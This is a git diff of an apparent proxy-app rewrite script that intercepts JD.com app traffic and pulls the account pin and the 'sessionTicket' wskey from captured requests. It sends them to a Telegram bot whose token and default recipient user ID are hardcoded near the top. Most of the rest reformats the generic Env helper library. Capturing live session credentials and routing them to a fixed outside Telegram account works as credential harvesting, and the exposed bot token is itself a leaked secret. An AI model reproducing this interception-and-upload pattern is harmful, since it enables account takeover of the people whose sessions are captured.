@@ -1,53 +1,36 @@
 /**
- * 1、支持 sso.jd.com 直接提取 Body 中的 sessionTicket (wskey) + pt_pin
- * 2、支持“拼图模式”：从 sh.jd.com 提取 wskey，从 api.m.jd.com 提取 pt_pin 自动组合
+ * 1、打开App，自动获取 wskey 上传
+ * 2、点击APP-个人中心，点消息，自动捕抓 wskey 上传
  * 注：如有变更才会上传，如果 wskey 没变，不会重复上传。
  */
 
 const $ = new Env('♨️上传 wskey');
 let CK = $request.headers['Cookie'] || $request.headers['cookie'] || '';
-let url = $request.url || '';
 
-// 从本地缓存读取之前的“拼图”
-let pin = $.getData('tmp_pin') || '';
-let key = $.getData('tmp_wskey') || '';
+let pin = '';
+let key = '';
 
-// 1. 尝试提取账号 pin (适配大部分带有 pt_pin 的请求)
+// 1. 提取账号 pin (sso接口的 Cookie 里依然包含 pt_pin)
 let pinMatch = CK.match(/(?:pt_)?pin=([^=;]+)/);
 if (pinMatch) {
-  if (pin !== pinMatch[1]) {
-    pin = pinMatch[1];
-    $.setData(pin, 'tmp_pin'); // 更新缓存
-  }
+  pin = pinMatch[1];
 }
 
-// 2. 尝试提取 wskey (适配 sh.jd.com 或其他带有 wskey= 的旧版请求头)
-let keyMatch = CK.match(/wskey=([^=;]+)/);
-if (keyMatch) {
-  if (key !== keyMatch[1]) {
-    key = keyMatch[1];
-    $.setData(key, 'tmp_wskey'); // 更新缓存
-  }
-}
-
-// 3. 尝试提取 wskey (适配最新的 sso.jd.com 请求体)
-if (url.includes('sso.jd.com') && typeof $request !== 'undefined' && $request.body) {
+// 2. 仅从新版接口的 Body 中提取 sessionTicket 作为 wskey
+if (typeof $request !== 'undefined' && $request.body) {
   try {
     let bodyData = JSON.parse($request.body);
     if (bodyData.jdstParams && bodyData.jdstParams.length > 0 && bodyData.jdstParams[0].sessionTicket) {
-      let bodyKey = bodyData.jdstParams[0].sessionTicket;
-      if (key !== bodyKey) {
-        key = bodyKey;
-        $.setData(key, 'tmp_wskey'); // 更新缓存
-      }
-      console.log('✅ 成功从 sso Body 提取到 wskey');
+      key = bodyData.jdstParams[0].sessionTicket;
+      console.log('✅ 成功从 Body(sessionTicket) 提取到 wskey');
     }
   } catch (e) {
-    console.log("❌ 解析 sso Body 失败: " + e);
+    console.log("❌ 解析 Body 提取 sessionTicket 失败: " + e);
   }
 }
 
 const _TGUserID = $.getData('JDGiaoBot');
+
 $.TGBotToken = '7284846213:AAHI4IIgA69v-CwxCwLfQi2NaVmPxZa5Itc';
 $.TGUserIDs = [7262532155];
 if (_TGUserID) {
@@ -55,9 +38,10 @@ if (_TGUserID) {
 }
 
 !(async () => {
-  // 4. 检查两块拼图是否集齐
   if (!pin || !key) {
-    console.log(`⏳ 凭证不全，正在收集拼图... 当前状态: pt_pin(${pin ? '已捕获' : '等待捕获'}), wskey(${key ? '已捕获' : '等待捕获'})`);
+    $.desc = '未找到 wskey(sessionTicket) 或 pin';
+    $.msg($.name, $.subt, $.desc);
+    console.log(`⚠️ 未找到有效凭证。当前 pin: ${pin}, key: ${key ? '已获取' : '为空'}`);
     $.done();
     return;
   }
@@ -110,8 +94,7 @@ if (_TGUserID) {
         await showMsg(userId);
       }
     } else {
-      // 为了防止每次 api 请求都输出，这里就不做弹窗通知了
-      // console.log(`♨️wskey 没有改变`); 
+      console.log(`♨️wskey 没有改变`);
     }
 
     return;
@@ -170,7 +153,6 @@ function showMsg() {
   });
 }
 
-// ================= ENV 核心环境代码 =================
 // https://github.com/chavyleung/scripts/blob/master/Env.js
 // prettier-ignore
 function Env(name, opts) {
@@ -178,10 +160,13 @@ function Env(name, opts) {
     constructor(env) {
       this.env = env;
     }
+
     send(opts, method = 'GET') {
       opts = typeof opts === 'string' ? { url: opts } : opts;
       let sender = this.get;
-      if (method === 'POST') sender = this.post;
+      if (method === 'POST') {
+        sender = this.post;
+      }
       return new Promise((resolve, reject) => {
         sender.call(this, opts, (err, resp, body) => {
           if (err) reject(err);
@@ -189,9 +174,16 @@ function Env(name, opts) {
         });
       });
     }
-    get(opts) { return this.send.call(this.env, opts); }
-    post(opts) { return this.send.call(this.env, opts, 'POST'); }
+
+    get(opts) {
+      return this.send.call(this.env, opts);
+    }
+
+    post(opts) {
+      return this.send.call(this.env, opts, 'POST');
+    }
   }
+
   return new (class {
     constructor(name, opts) {
       this.name = name;
@@ -204,96 +196,196 @@ function Env(name, opts) {
       this.logSeparator = '\n';
       this.startTime = new Date().getTime();
       Object.assign(this, opts);
+      this.log('', `🔔${this.name}, 开始!`);
     }
-    isNode() { return 'undefined' !== typeof module && !!module.exports; }
-    isQuanX() { return 'undefined' !== typeof $task; }
-    isSurge() { return 'undefined' !== typeof $httpClient && 'undefined' === typeof $loon; }
-    isLoon() { return 'undefined' !== typeof $loon; }
-    isShadowrocket() { return 'undefined' !== typeof $rocket; }
-    toObj(str, defaultValue = null) { try { return JSON.parse(str); } catch { return defaultValue; } }
-    toStr(obj, defaultValue = null) { try { return JSON.stringify(obj); } catch { return defaultValue; } }
+
+    isNode() {
+      return 'undefined' !== typeof module && !!module.exports;
+    }
+
+    isQuanX() {
+      return 'undefined' !== typeof $task;
+    }
+
+    isSurge() {
+      return 'undefined' !== typeof $httpClient && 'undefined' === typeof $loon;
+    }
+
+    isLoon() {
+      return 'undefined' !== typeof $loon;
+    }
+
+    isShadowrocket() {
+      return 'undefined' !== typeof $rocket;
+    }
+
+    toObj(str, defaultValue = null) {
+      try {
+        return JSON.parse(str);
+      } catch {
+        return defaultValue;
+      }
+    }
+
+    toStr(obj, defaultValue = null) {
+      try {
+        return JSON.stringify(obj);
+      } catch {
+        return defaultValue;
+      }
+    }
+
     getJson(key, defaultValue) {
       let json = defaultValue;
       const val = this.getData(key);
-      if (val) { try { json = JSON.parse(this.getData(key)); } catch {} }
+      if (val) {
+        try {
+          json = JSON.parse(this.getData(key));
+        } catch {}
+      }
       return json;
     }
-    setJson(val, key) { try { return this.setData(JSON.stringify(val), key); } catch { return false; } }
-    getScript(url) { return new Promise((resolve) => { this.get({ url }, (err, resp, body) => resolve(body)); }); }
+
+    setJson(val, key) {
+      try {
+        return this.setData(JSON.stringify(val), key);
+      } catch {
+        return false;
+      }
+    }
+
+    getScript(url) {
+      return new Promise((resolve) => {
+        this.get({ url }, (err, resp, body) => resolve(body));
+      });
+    }
+
     runScript(script, runOpts) {
       return new Promise((resolve) => {
         let httpApi = this.getData('@chavy_boxjs_userCfgs.httpApi');
         httpApi = httpApi ? httpApi.replace(/\n/g, '').trim() : httpApi;
-        let httpApi_timeout = this.getData('@chavy_boxjs_userCfgs.httpApi_timeout');
+        let httpApi_timeout = this.getData(
+          '@chavy_boxjs_userCfgs.httpApi_timeout'
+        );
         httpApi_timeout = httpApi_timeout ? httpApi_timeout * 1 : 20;
-        httpApi_timeout = runOpts && runOpts.timeout ? runOpts.timeout : httpApi_timeout;
+        httpApi_timeout =
+          runOpts && runOpts.timeout ? runOpts.timeout : httpApi_timeout;
         const [key, addr] = httpApi.split('@');
         const opts = {
           url: `http://${addr}/v1/scripting/evaluate`,
-          body: { script_text: script, mock_type: 'cron', timeout: httpApi_timeout },
+          body: {
+            script_text: script,
+            mock_type: 'cron',
+            timeout: httpApi_timeout,
+          },
           headers: { 'X-Key': key, Accept: '*/*' },
         };
         this.post(opts, (err, resp, body) => resolve(body));
       }).catch((e) => this.logErr(e));
     }
+
     loadData() {
       if (this.isNode()) {
         this.fs = this.fs ? this.fs : require('fs');
         this.path = this.path ? this.path : require('path');
         const curDirDataFilePath = this.path.resolve(this.dataFile);
-        const rootDirDataFilePath = this.path.resolve(process.cwd(), this.dataFile);
+        const rootDirDataFilePath = this.path.resolve(
+          process.cwd(),
+          this.dataFile
+        );
         const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
-        const isRootDirDataFile = !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
+        const isRootDirDataFile =
+          !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
         if (isCurDirDataFile || isRootDirDataFile) {
-          const datPath = isCurDirDataFile ? curDirDataFilePath : rootDirDataFilePath;
-          try { return JSON.parse(this.fs.readFileSync(datPath)); } catch (e) { return {}; }
+          const datPath = isCurDirDataFile
+            ? curDirDataFilePath
+            : rootDirDataFilePath;
+          try {
+            return JSON.parse(this.fs.readFileSync(datPath));
+          } catch (e) {
+            return {};
+          }
         } else return {};
       } else return {};
     }
+
     writeData() {
       if (this.isNode()) {
         this.fs = this.fs ? this.fs : require('fs');
         this.path = this.path ? this.path : require('path');
         const curDirDataFilePath = this.path.resolve(this.dataFile);
-        const rootDirDataFilePath = this.path.resolve(process.cwd(), this.dataFile);
+        const rootDirDataFilePath = this.path.resolve(
+          process.cwd(),
+          this.dataFile
+        );
         const isCurDirDataFile = this.fs.existsSync(curDirDataFilePath);
-        const isRootDirDataFile = !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
+        const isRootDirDataFile =
+          !isCurDirDataFile && this.fs.existsSync(rootDirDataFilePath);
         const jsonData = JSON.stringify(this.data);
-        if (isCurDirDataFile) { this.fs.writeFileSync(curDirDataFilePath, jsonData); }
-        else if (isRootDirDataFile) { this.fs.writeFileSync(rootDirDataFilePath, jsonData); }
-        else { this.fs.writeFileSync(curDirDataFilePath, jsonData); }
+        if (isCurDirDataFile) {
+          this.fs.writeFileSync(curDirDataFilePath, jsonData);
+        } else if (isRootDirDataFile) {
+          this.fs.writeFileSync(rootDirDataFilePath, jsonData);
+        } else {
+          this.fs.writeFileSync(curDirDataFilePath, jsonData);
+        }
       }
     }
+
     lodash_get(source, path, defaultValue = undefined) {
       const paths = path.replace(/\[(\d+)\]/g, '.$1').split('.');
       let result = source;
       for (const p of paths) {
         result = Object(result)[p];
-        if (result === undefined) { return defaultValue; }
+        if (result === undefined) {
+          return defaultValue;
+        }
       }
       return result;
     }
+
     lodash_set(obj, path, value) {
       if (Object(obj) !== obj) return obj;
       if (!Array.isArray(path)) path = path.toString().match(/[^.[\]]+/g) || [];
-      path.slice(0, -1).reduce((a, c, i) => Object(a[c]) === a[c] ? a[c] : (a[c] = Math.abs(path[i + 1]) >> 0 === +path[i + 1] ? [] : {}), obj)[path[path.length - 1]] = value;
+      path
+        .slice(0, -1)
+        .reduce(
+          (a, c, i) =>
+            Object(a[c]) === a[c]
+              ? a[c]
+              : (a[c] = Math.abs(path[i + 1]) >> 0 === +path[i + 1] ? [] : {}),
+          obj
+        )[path[path.length - 1]] = value;
       return obj;
     }
+
     getData(key) {
       let val = this.getVal(key);
       if (/^@/.test(key)) {
         const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
         const objVal = objKey ? this.getVal(objKey) : '';
-        if (objVal) { try { const objedVal = JSON.parse(objVal); val = objedVal ? this.lodash_get(objedVal, paths, '') : val; } catch (e) { val = ''; } }
+        if (objVal) {
+          try {
+            const objedVal = JSON.parse(objVal);
+            val = objedVal ? this.lodash_get(objedVal, paths, '') : val;
+          } catch (e) {
+            val = '';
+          }
+        }
       }
       return val;
     }
+
     setData(val, key) {
       let isSuc = false;
       if (/^@/.test(key)) {
         const [, objKey, paths] = /^@(.*?)\.(.*?)$/.exec(key);
         const objdat = this.getVal(objKey);
-        const objVal = objKey ? objdat === 'null' ? null : objdat || '{}' : '{}';
+        const objVal = objKey
+          ? objdat === 'null'
+            ? null
+            : objdat || '{}'
+          : '{}';
         try {
           const objedVal = JSON.parse(objVal);
           this.lodash_set(objedVal, paths, val);
@@ -303,67 +395,186 @@ function Env(name, opts) {
           this.lodash_set(objedVal, paths, val);
           isSuc = this.setVal(JSON.stringify(objedVal), objKey);
         }
-      } else { isSuc = this.setVal(val, key); }
+      } else {
+        isSuc = this.setVal(val, key);
+      }
       return isSuc;
     }
+
     getVal(key) {
-      if (this.isSurge() || this.isLoon()) { return $persistentStore.read(key); }
-      else if (this.isQuanX()) { return $prefs.valueForKey(key); }
-      else if (this.isNode()) { this.data = this.loadData(); return this.data[key]; }
-      else { return (this.data && this.data[key]) || null; }
+      if (this.isSurge() || this.isLoon()) {
+        return $persistentStore.read(key);
+      } else if (this.isQuanX()) {
+        return $prefs.valueForKey(key);
+      } else if (this.isNode()) {
+        this.data = this.loadData();
+        return this.data[key];
+      } else {
+        return (this.data && this.data[key]) || null;
+      }
     }
+
     setVal(val, key) {
-      if (this.isSurge() || this.isLoon()) { return $persistentStore.write(val, key); }
-      else if (this.isQuanX()) { return $prefs.setValueForKey(val, key); }
-      else if (this.isNode()) { this.data = this.loadData(); this.data[key] = val; this.writeData(); return true; }
-      else { return (this.data && this.data[key]) || null; }
+      if (this.isSurge() || this.isLoon()) {
+        return $persistentStore.write(val, key);
+      } else if (this.isQuanX()) {
+        return $prefs.setValueForKey(val, key);
+      } else if (this.isNode()) {
+        this.data = this.loadData();
+        this.data[key] = val;
+        this.writeData();
+        return true;
+      } else {
+        return (this.data && this.data[key]) || null;
+      }
     }
+
     initGotEnv(opts) {
       this.got = this.got ? this.got : require('got');
       this.ckTough = this.ckTough ? this.ckTough : require('tough-cookie');
       this.ckJar = this.ckJar ? this.ckJar : new this.ckTough.CookieJar();
       if (opts) {
         opts.headers = opts.headers ? opts.headers : {};
-        if (undefined === opts.headers.Cookie && undefined === opts.cookieJar) { opts.cookieJar = this.ckJar; }
+        if (undefined === opts.headers.Cookie && undefined === opts.cookieJar) {
+          opts.cookieJar = this.ckJar;
+        }
       }
     }
+
     get(opts, callback = () => {}) {
-      if (opts.headers) { delete opts.headers['Content-Type']; delete opts.headers['Content-Length']; }
+      if (opts.headers) {
+        delete opts.headers['Content-Type'];
+        delete opts.headers['Content-Length'];
+      }
       if (this.isSurge() || this.isLoon()) {
-        if (this.isSurge() && this.isNeedRewrite) { opts.headers = opts.headers || {}; Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false }); }
-        $httpClient.get(opts, (err, resp, body) => { if (!err && resp) { resp.body = body; resp.statusCode = resp.status; } callback(err, resp, body); });
+        if (this.isSurge() && this.isNeedRewrite) {
+          opts.headers = opts.headers || {};
+          Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false });
+        }
+        $httpClient.get(opts, (err, resp, body) => {
+          if (!err && resp) {
+            resp.body = body;
+            resp.statusCode = resp.status;
+          }
+          callback(err, resp, body);
+        });
       } else if (this.isQuanX()) {
-        if (this.isNeedRewrite) { opts.opts = opts.opts || {}; Object.assign(opts.opts, { hints: false }); }
-        $task.fetch(opts).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => callback(err));
+        if (this.isNeedRewrite) {
+          opts.opts = opts.opts || {};
+          Object.assign(opts.opts, { hints: false });
+        }
+        $task.fetch(opts).then(
+          (resp) => {
+            const { statusCode: status, statusCode, headers, body } = resp;
+            callback(null, { status, statusCode, headers, body }, body);
+          },
+          (err) => callback(err)
+        );
       } else if (this.isNode()) {
         this.initGotEnv(opts);
-        this.got(opts).on('redirect', (resp, nextOpts) => { try { if (resp.headers['set-cookie']) { const ck = resp.headers['set-cookie'].map(this.ckTough.Cookie.parse).toString(); if (ck) { this.ckJar.setCookieSync(ck, null); } nextOpts.cookieJar = this.ckJar; } } catch (e) { this.logErr(e); } }).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => { const { message: error, response: resp } = err; callback(error, resp, resp && resp.body); });
+        this.got(opts)
+          .on('redirect', (resp, nextOpts) => {
+            try {
+              if (resp.headers['set-cookie']) {
+                const ck = resp.headers['set-cookie']
+                  .map(this.ckTough.Cookie.parse)
+                  .toString();
+                if (ck) {
+                  this.ckJar.setCookieSync(ck, null);
+                }
+                nextOpts.cookieJar = this.ckJar;
+              }
+            } catch (e) {
+              this.logErr(e);
+            }
+          })
+          .then(
+            (resp) => {
+              const { statusCode: status, statusCode, headers, body } = resp;
+              callback(null, { status, statusCode, headers, body }, body);
+            },
+            (err) => {
+              const { message: error, response: resp } = err;
+              callback(error, resp, resp && resp.body);
+            }
+          );
       }
     }
+
     post(opts, callback = () => {}) {
       const method = opts.method ? opts.method.toLocaleLowerCase() : 'post';
-      if (opts.body && opts.headers && !opts.headers['Content-Type']) { opts.headers['Content-Type'] = 'application/x-www-form-urlencoded'; }
+      if (opts.body && opts.headers && !opts.headers['Content-Type']) {
+        opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+      }
       if (opts.headers) delete opts.headers['Content-Length'];
       if (this.isSurge() || this.isLoon()) {
-        if (this.isSurge() && this.isNeedRewrite) { opts.headers = opts.headers || {}; Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false }); }
-        $httpClient[method](opts, (err, resp, body) => { if (!err && resp) { resp.body = body; resp.statusCode = resp.status; } callback(err, resp, body); });
+        if (this.isSurge() && this.isNeedRewrite) {
+          opts.headers = opts.headers || {};
+          Object.assign(opts.headers, { 'X-Surge-Skip-Scripting': false });
+        }
+        $httpClient[method](opts, (err, resp, body) => {
+          if (!err && resp) {
+            resp.body = body;
+            resp.statusCode = resp.status;
+          }
+          callback(err, resp, body);
+        });
       } else if (this.isQuanX()) {
         opts.method = method;
-        if (this.isNeedRewrite) { opts.opts = opts.opts || {}; Object.assign(opts.opts, { hints: false }); }
-        $task.fetch(opts).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => callback(err));
+        if (this.isNeedRewrite) {
+          opts.opts = opts.opts || {};
+          Object.assign(opts.opts, { hints: false });
+        }
+        $task.fetch(opts).then(
+          (resp) => {
+            const { statusCode: status, statusCode, headers, body } = resp;
+            callback(null, { status, statusCode, headers, body }, body);
+          },
+          (err) => callback(err)
+        );
       } else if (this.isNode()) {
         this.initGotEnv(opts);
         const { url, ..._opts } = opts;
-        this.got[method](url, _opts).then((resp) => { const { statusCode: status, statusCode, headers, body } = resp; callback(null, { status, statusCode, headers, body }, body); }, (err) => { const { message: error, response: resp } = err; callback(error, resp, resp && resp.body); });
+        this.got[method](url, _opts).then(
+          (resp) => {
+            const { statusCode: status, statusCode, headers, body } = resp;
+            callback(null, { status, statusCode, headers, body }, body);
+          },
+          (err) => {
+            const { message: error, response: resp } = err;
+            callback(error, resp, resp && resp.body);
+          }
+        );
       }
     }
+    
     time(fmt, ts = null) {
       const date = ts ? new Date(ts) : new Date();
-      let o = { 'M+': date.getMonth() + 1, 'd+': date.getDate(), 'H+': date.getHours(), 'm+': date.getMinutes(), 's+': date.getSeconds(), 'q+': Math.floor((date.getMonth() + 3) / 3), S: date.getMilliseconds(), };
-      if (/(y+)/.test(fmt)) fmt = fmt.replace(RegExp.$1, (date.getFullYear() + '').substr(4 - RegExp.$1.length));
-      for (let k in o) if (new RegExp('(' + k + ')').test(fmt)) fmt = fmt.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ('00' + o[k]).substr(('' + o[k]).length));
+      let o = {
+        'M+': date.getMonth() + 1,
+        'd+': date.getDate(),
+        'H+': date.getHours(),
+        'm+': date.getMinutes(),
+        's+': date.getSeconds(),
+        'q+': Math.floor((date.getMonth() + 3) / 3),
+        S: date.getMilliseconds(),
+      };
+      if (/(y+)/.test(fmt))
+        fmt = fmt.replace(
+          RegExp.$1,
+          (date.getFullYear() + '').substr(4 - RegExp.$1.length)
+        );
+      for (let k in o)
+        if (new RegExp('(' + k + ')').test(fmt))
+          fmt = fmt.replace(
+            RegExp.$1,
+            RegExp.$1.length == 1
+              ? o[k]
+              : ('00' + o[k]).substr(('' + o[k]).length)
+          );
       return fmt;
     }
+
     msg(title = name, subt = '', desc = '', opts) {
       const toEnvOpts = (rawOpts) => {
         if (!rawOpts) return rawOpts;
@@ -373,24 +584,73 @@ function Env(name, opts) {
           else if (this.isSurge()) return { url: rawOpts };
           else return undefined;
         } else if (typeof rawOpts === 'object') {
-          if (this.isLoon()) { let openUrl = rawOpts.openUrl || rawOpts.url || rawOpts['open-url']; let mediaUrl = rawOpts.mediaUrl || rawOpts['media-url']; return { openUrl, mediaUrl }; }
-          else if (this.isQuanX()) { let openUrl = rawOpts['open-url'] || rawOpts.url || rawOpts.openUrl; let mediaUrl = rawOpts['media-url'] || rawOpts.mediaUrl; let updatePasteboard = rawOpts['update-pasteboard'] || rawOpts.updatePasteboard; return { 'open-url': openUrl, 'media-url': mediaUrl, 'update-pasteboard': updatePasteboard, }; }
-          else if (this.isSurge()) { let openUrl = rawOpts.url || rawOpts.openUrl || rawOpts['open-url']; return { url: openUrl }; }
-        } else { return undefined; }
+          if (this.isLoon()) {
+            let openUrl = rawOpts.openUrl || rawOpts.url || rawOpts['open-url'];
+            let mediaUrl = rawOpts.mediaUrl || rawOpts['media-url'];
+            return { openUrl, mediaUrl };
+          } else if (this.isQuanX()) {
+            let openUrl = rawOpts['open-url'] || rawOpts.url || rawOpts.openUrl;
+            let mediaUrl = rawOpts['media-url'] || rawOpts.mediaUrl;
+            let updatePasteboard =
+              rawOpts['update-pasteboard'] || rawOpts.updatePasteboard;
+            return {
+              'open-url': openUrl,
+              'media-url': mediaUrl,
+              'update-pasteboard': updatePasteboard,
+            };
+          } else if (this.isSurge()) {
+            let openUrl = rawOpts.url || rawOpts.openUrl || rawOpts['open-url'];
+            return { url: openUrl };
+          }
+        } else {
+          return undefined;
+        }
       };
       if (!this.isMute) {
-        if (this.isSurge() || this.isLoon()) { $notification.post(title, subt, desc, toEnvOpts(opts)); }
-        else if (this.isQuanX()) { $notify(title, subt, desc, toEnvOpts(opts)); }
+        if (this.isSurge() || this.isLoon()) {
+          $notification.post(title, subt, desc, toEnvOpts(opts));
+        } else if (this.isQuanX()) {
+          $notify(title, subt, desc, toEnvOpts(opts));
+        }
       }
       if (!this.isMuteLog) {
         let logs = ['', '==============📣系统通知📣=============='];
-        logs.push(title); subt ? logs.push(subt) : ''; desc ? logs.push(desc) : '';
-        console.log(logs.join('\n')); this.logs = this.logs.concat(logs);
+        logs.push(title);
+        subt ? logs.push(subt) : '';
+        desc ? logs.push(desc) : '';
+        console.log(logs.join('\n'));
+        this.logs = this.logs.concat(logs);
       }
     }
-    log(...logs) { if (logs.length > 0) { this.logs = [...this.logs, ...logs]; } console.log(logs.join(this.logSeparator)); }
-    logErr(err, msg) { const isPrintSack = !this.isSurge() && !this.isQuanX() && !this.isLoon(); if (!isPrintSack) { this.log('', `❗️${this.name}, 错误!`, err); } else { this.log('', `❗️${this.name}, 错误!`, err.stack); } }
-    wait(time) { return new Promise((resolve) => setTimeout(resolve, time)); }
-    done(val = {}) { const endTime = new Date().getTime(); const costTime = (endTime - this.startTime) / 1000; this.log('', `🔔${this.name}, 结束! 🕛 ${costTime} 秒`); this.log(); if (this.isSurge() || this.isQuanX() || this.isLoon()) { $done(val); } }
+
+    log(...logs) {
+      if (logs.length > 0) {
+        this.logs = [...this.logs, ...logs];
+      }
+      console.log(logs.join(this.logSeparator));
+    }
+
+    logErr(err, msg) {
+      const isPrintSack = !this.isSurge() && !this.isQuanX() && !this.isLoon();
+      if (!isPrintSack) {
+        this.log('', `❗️${this.name}, 错误!`, err);
+      } else {
+        this.log('', `❗️${this.name}, 错误!`, err.stack);
+      }
+    }
+
+    wait(time) {
+      return new Promise((resolve) => setTimeout(resolve, time));
+    }
+
+    done(val = {}) {
+      const endTime = new Date().getTime();
+      const costTime = (endTime - this.startTime) / 1000;
+      this.log('', `🔔${this.name}, 结束! 🕛 ${costTime} 秒`);
+      this.log();
+      if (this.isSurge() || this.isQuanX() || this.isLoon()) {
+        $done(val);
+      }
+    }
   })(name, opts);
 }
